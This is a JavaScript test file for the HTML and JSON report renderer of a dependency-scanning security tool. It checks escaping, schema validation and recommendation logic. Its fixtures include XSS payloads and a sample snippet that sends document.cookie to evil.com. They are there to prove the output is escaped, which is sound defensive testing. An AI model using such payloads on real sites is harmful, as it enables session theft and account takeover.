import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFile, writeFile, mkdtemp, rm } from 'node:fs/promises';
import { resolve, join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  escapeHtml,
  deriveKeyReasons,
  buildReportData,
  renderHtmlReport,
  generateReport
} from '../src/report.mjs';
import { validateAgainstSchema } from '../src/validation.mjs';

const digest = 'a'.repeat(64);
const cleanEvidence = () => ({schemaVersion:'1.0', runId:'test', mode:'fixture', subjectDigest:digest, scannerVersion:'0.1.0', policyDigest:digest, collectionStatus:'complete', packages:[], observations:[], sources:[], unknowns:[]});
const completeFindings = () => ({schemaVersion:'1.0', subjectDigest:digest, investigations:['typosquat-detective','provenance-auditor','behavior-analyst'].map(role => ({schemaVersion:'1.0', subjectDigest:digest, role, status:'complete', recommendation:'ALLOW', findings:[], unknowns:[]})), aggregateRecommendation:'ALLOW', investigationComplete:true});

async function withRun(fn) {
  const dir = await mkdtemp(join(tmpdir(), 'bouncer-report-test-'));
  try { return await fn(dir); }
  finally {
    assert.ok(resolve(dir).startsWith(resolve(tmpdir()) + '\\') || resolve(dir).startsWith(resolve(tmpdir()) + '/'));
    await rm(dir, {recursive:true, force:true});
  }
}

describe('JSON/HTML Report Renderer Tests (Step 10)', () => {
  it('escapes malicious HTML characters to prevent XSS in reports', () => {
    assert.equal(escapeHtml('<script>alert("xss")</script>'), '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    assert.equal(escapeHtml('"><img src=x onerror=alert(1)>'), '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;');
    assert.equal(escapeHtml("Tom & 'Jerry'"), 'Tom &amp; &#39;Jerry&#39;');
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
  });

  it('derives top 3 key reasons prioritizing critical and high observations', () => {
    const evidence = {
      collectionStatus: 'quarantine',
      observations: [
        { packageName: 'pkg-a', ruleId: 'LIFECYCLE_SCRIPT_ADDED', severity: 'medium', explanation: 'Added install script' },
        { packageName: 'pkg-b', ruleId: 'ARTIFACT_INTEGRITY_MISMATCH', severity: 'critical', explanation: 'Hash mismatch' },
        { packageName: 'pkg-c', ruleId: 'PROCESS_EXECUTION', severity: 'high', explanation: 'Child process execution' },
        { packageName: 'pkg-d', ruleId: 'ENVIRONMENT_ACCESS', severity: 'medium', explanation: 'Env var access' }
      ]
    };

    const reasons = deriveKeyReasons(evidence);
    assert.equal(reasons.length, 3);
    assert.match(reasons[0], /Hash mismatch/);
    assert.match(reasons[1], /Child process execution/);
    assert.match(reasons[2], /Added install script/);
  });

  it('builds valid report data structure matching schemas/report.schema.json', async () => {
    const evidence = {
      ...cleanEvidence(),
      runId: 'test-run-123',
      subjectDigest: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
      mode: 'fixture',
      collectionStatus: 'complete',
      packages: [
        {
          name: 'picocolors',
          location: 'node_modules/picocolors',
          changeType: 'added',
          isDirect: true,
          version: '1.1.1',
          previousVersion: null,
          hasInstallScript: false
        }
      ],
      observations: [],
      unknowns: ['Runtime behavior was not executed.']
    };

    const reportData = buildReportData(evidence, null, null, 'reports/demo/test-run');
    assert.equal(reportData.schemaVersion, '1.0');
    assert.equal(reportData.overallRecommendation, 'QUARANTINE');
    assert.equal(reportData.reviewStatus, 'Awaiting complete Bob investigations');
    assert.equal(reportData.reviewCommand, null);

    // Validate against schemas/report.schema.json
    const schemaRaw = await readFile(resolve('schemas/report.schema.json'), 'utf8');
    const reportSchema = JSON.parse(schemaRaw);
    assert.doesNotThrow(() => {
      validateAgainstSchema(reportSchema, reportData);
    });
  });

  it('renders complete HTML report containing all Section 9 required sections and escaping hostile content', () => {
    const reportData = {
      schemaVersion: '1.0',
      runId: 'run-xss-test',
      subjectDigest: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
      generatedAt: '2026-09-27T12:00:00.000Z',
      mode: 'fixture',
      collectionStatus: 'quarantine',
      overallRecommendation: 'BLOCK',
      keyReasons: ['Malicious package detected', 'Reason 2', 'Reason 3'],
      packages: [
        {
          name: '<script>evil</script>',
          changeType: 'added',
          isDirect: true,
          version: '1.0.0',
          previousVersion: null,
          location: 'node_modules/<script>',
          hasInstallScript: true,
          integrity: 'sha512-test=='
        }
      ],
      investigations: null,
      observations: [
        {
          id: 'obs-1',
          packageName: '<script>evil</script>',
          ruleId: 'LIFECYCLE_SCRIPT_ADDED',
          severity: 'high',
          evidenceRef: 'package.json#scripts',
          snippet: 'fetch("http://evil.com?cookie=" + document.cookie)',
          explanation: 'Hostile code detected: <script>alert(1)</script>'
        }
      ],
      unknowns: ['Runtime not observed.'],
      reviewStatus: 'Awaiting human review',
      reviewCommand: 'node src/cli.mjs review --run test --interactive --mode trusted-local-demo'
    };

    const html = renderHtmlReport(reportData);

    // 1. Check all required sections are present
    assert.ok(html.includes('Supply Chain Bouncer &mdash; Dependency Review'));
    assert.ok(html.includes('Top Findings &amp; Recommendation Rationale'));
    assert.ok(html.includes('1. Human Review Decision Status'));
    assert.ok(html.includes('2. Changed Dependencies'));
    assert.ok(html.includes('3. Deterministic Static Observations'));
    assert.ok(html.includes('4. Bob Investigator Results'));
    assert.ok(html.includes('5. Coverage Limits &amp; Explicit Unknowns'));
    assert.ok(html.includes('6. Remediation &amp; Compatibility Guidance'));

    // 2. Check XSS prevention: unescaped script tag must NOT exist in HTML
    assert.equal(html.includes('<script>evil</script>'), false);
    assert.ok(html.includes('&lt;script&gt;evil&lt;/script&gt;'));
    assert.equal(html.includes('<script>alert(1)</script>'), false);
    assert.ok(html.includes('&lt;script&gt;alert(1)&lt;/script&gt;'));
  });

  it('generates report.json and report.html on disk via generateReport', async () => {
    await withRun(async dir => {
    await writeFile(join(dir, 'evidence.json'), await readFile('reports/demo/live-benign/evidence.json'));
    const result = await generateReport(dir);

    assert.ok(result.reportJsonPath.endsWith('report.json'));
    assert.ok(result.reportHtmlPath.endsWith('report.html'));

    const jsonOnDisk = JSON.parse(await readFile(result.reportJsonPath, 'utf8'));
    const htmlOnDisk = await readFile(result.reportHtmlPath, 'utf8');

    assert.equal(jsonOnDisk.overallRecommendation, 'QUARANTINE');
    assert.ok(htmlOnDisk.includes('<!DOCTYPE html>'));
    assert.ok(htmlOnDisk.includes('Supply Chain Bouncer'));

    // Validate disk report against report schema
    const schemaRaw = await readFile(resolve('schemas/report.schema.json'), 'utf8');
    const reportSchema = JSON.parse(schemaRaw);
    assert.doesNotThrow(() => {
      validateAgainstSchema(reportSchema, jsonOnDisk);
    });
    });
  });

  it('requires all three completed roles and recomputes the recommendation', () => {
    const findings = completeFindings();
    assert.equal(buildReportData(cleanEvidence(), findings).overallRecommendation, 'ALLOW');
    findings.investigations[2].recommendation = 'BLOCK';
    assert.equal(buildReportData(cleanEvidence(), findings).overallRecommendation, 'BLOCK');
    findings.investigations.pop();
    assert.equal(buildReportData(cleanEvidence(), findings).overallRecommendation, 'QUARANTINE');
    findings.investigations[0].status = 'failed';
    assert.equal(buildReportData(cleanEvidence(), findings).investigationComplete, false);
  });

  it('does not let human ALLOW override missing evidence or an integrity violation', () => {
    const decision = {schemaVersion:'1.1', mode:'trusted-local-demo', subjectDigest:digest, decision:'ALLOW', reason:'Expected behavior', reviewerLabel:'test', createdAt:new Date().toISOString()};
    const evidence = cleanEvidence();
    evidence.collectionStatus = 'incomplete';
    assert.equal(buildReportData(evidence, completeFindings(), decision).overallRecommendation, 'QUARANTINE');
    evidence.observations.push({id:'integrity',ruleId:'ARTIFACT_INTEGRITY_MISMATCH',severity:'critical',explanation:'Mismatch'});
    assert.equal(buildReportData(evidence, completeFindings(), decision).overallRecommendation, 'BLOCK');
  });

  it('rejects stale inputs, duplicate roles, unsupported signatures, and invented citations', () => {
    const findings = completeFindings();
    findings.subjectDigest = 'b'.repeat(64);
    assert.throws(() => buildReportData(cleanEvidence(), findings), /subjectDigest/);
    findings.subjectDigest = digest;
    findings.investigations[0].subjectDigest = 'b'.repeat(64);
    assert.throws(() => buildReportData(cleanEvidence(), findings), /subjectDigest/);
    findings.investigations[0].subjectDigest = digest;
    findings.investigations[1].role = findings.investigations[0].role;
    assert.throws(() => buildReportData(cleanEvidence(), findings), /Duplicate/);
    const cited = completeFindings();
    cited.investigations[0].findings = [{id:'f1',evidenceIds:['made-up'],severity:'low',confidence:'low',observation:'None',interpretation:'None',suggestedAction:'Review'}];
    assert.throws(() => buildReportData(cleanEvidence(), cited), /references/);
    const decision = {schemaVersion:'1.1',mode:'trusted-local-demo',subjectDigest:'b'.repeat(64),decision:'ALLOW',reason:'test',reviewerLabel:'test',createdAt:'now'};
    assert.throws(() => buildReportData(cleanEvidence(), null, decision), /subjectDigest/);
    decision.subjectDigest=digest; decision.mode='signed-local';
    assert.throws(() => buildReportData(cleanEvidence(), null, decision), /Signed/);
  });

  it('does not invent integrity or semver claims and preserves investigator unknowns', () => {
    const findings = completeFindings(); findings.investigations[0].unknowns=['No historical data'];
    const report = buildReportData(cleanEvidence(), findings);
    assert.ok(report.unknowns.some(s => s.includes('No historical data')));
    assert.ok(!report.keyReasons.some(s => s.includes('matched published') || s.includes('semver')));
  });

  it('rejects malformed optional files instead of treating them as absent', async () => {
    await withRun(async dir => {
      await writeFile(join(dir,'evidence.json'), JSON.stringify(cleanEvidence()));
      await writeFile(join(dir,'findings.json'), '{bad json');
      await assert.rejects(generateReport(dir), /findings.json/);
      await writeFile(join(dir,'findings.json'), JSON.stringify(completeFindings()));
      await writeFile(join(dir,'decision.json'), '{bad json');
      await assert.rejects(generateReport(dir), /decision.json/);
    });
  });

  it('escapes injected metadata excerpts and excludes unchanged packages from the changed table', () => {
    const evidence = cleanEvidence();
    evidence.packages=[{name:'not-changed',location:'node_modules/not-changed',isDirect:true,changeType:'unchanged'}];
    evidence.observations=[{id:'injection',ruleId:'PROMPT_INJECTION_INDICATOR',severity:'high',explanation:'Untrusted instructions',untrustedExcerpt:'<script>injected()</script>'}];
    const html=renderHtmlReport(buildReportData(evidence));
    assert.ok(html.includes('&lt;script&gt;injected()&lt;/script&gt;'));
    assert.ok(!html.includes('<script>injected()</script>'));
    assert.ok(html.includes('Changed Dependencies (0 instances)'));
  });
});
